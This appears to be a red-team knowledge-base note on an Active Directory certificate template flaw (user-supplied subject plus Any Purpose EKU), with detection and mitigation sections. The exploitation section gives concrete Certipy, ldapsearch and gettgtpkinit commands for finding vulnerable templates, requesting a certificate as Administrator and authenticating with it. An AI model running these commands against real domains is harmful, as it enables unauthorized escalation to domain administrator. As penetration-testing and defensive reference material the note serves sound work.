---
tags:
  - attack
  - knowledge
  - AD
  - windows
  - redteam
date: 2023-09-1
---
- Certificate template misconfiguration.
- Template allows:
	- requester to supply own subject (e.g. [[ESC1]]) and
	- contains `Any Purpose EKU` (2.5.29.37.0) - signals the cert can be used for any type of authentication.
# Background

- Normal certs defined a specific EKU for a task:
	- `Client Authentication` - used to log on via [[PKINIT authentication|PKINIT]]
	- `Smart Card Logon` - also used for [[Kerberos]]
	- `Server Authentication` - for TLS/LDAP server certs
- `Any Purpose EKU` is:
	- a special EKU that means it is valid for all EKU types.
- If cert chains to a trusted CA, AD does not care what is done with it.
- If cert templates allows custom SAN or Subject field:
	- you can request cert for Administrator.
	- and logon via PKINIT, even if no explicit ClientAuth EKU.
# Vulnerable Criteria

- Template is vulnerable if it has:
	- `ENROLLE_SUPPLIES_SUBJECT` enabled.
	- `EKU` includes `Any Purpose`.
	- You have enrol rights.
	- CA is actively issuing certs.
# Exploitation

- Use [[Certipy]] or [[Ldapsearch]]to enumerate:
	- `certipy find -u user@domain.local -p 'Pass123!' -dc-ip 10.0.0.5 -vulnerable`
		- look for `EKU: Any Purpose` or `ENROLLE_SUPPLIES_SUBJECT: True`
	- `ldapsearch -x -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" "(|(msPKI-Certificate-Name-Flag=1)(msPKI-Extended-Key-Usage=2.5.29.37.0))" `
- Request cert impersonating an admin:
	- `certipy req -u user@domain.local -p 'Pass123!' -template VulnAnyPurpose -ca CA01\corp-CA -upn Administrator@domain.local -dc-ip 10.0.0.5 -output esc5`
- Authenticate:
	- `certipy auth -pfx esc5.pfx -dc-ip 10.0.0.5`
	- `gettgtpkinit.py -pfx esc5.pfx domain.local\administrator`
# Detection

- `Event ID 4886/4887` - watch for certs issued with:
	- `SubjectAltName` = admin accounts
	- `EKU = Any Purpose`
- Monitor for [[AS-REQ (Authentication Request)|AS-REQs]] using certs from low priv accounts with mismatched subject fields.
- Diff template config over time.
# Mitigation

- Avoid using Any Purpose EKU on templates allowing:
	- User-supplied subjects
	- Broad enrollment permissions
- Audit existing templates:
	- Dump all template EKUs:
		- `certipy find -vulnerable -u user@domain -p pass -dc-ip <ip>`
		- `Get-CertificateTemplate | Select-Object -ExpandProperty EKU`
- Remove `ENROLLE_SUPPLIES_SUBJECT` or set to `Build from AD information`.
- Require manager approval or use restricted groups for enrollment.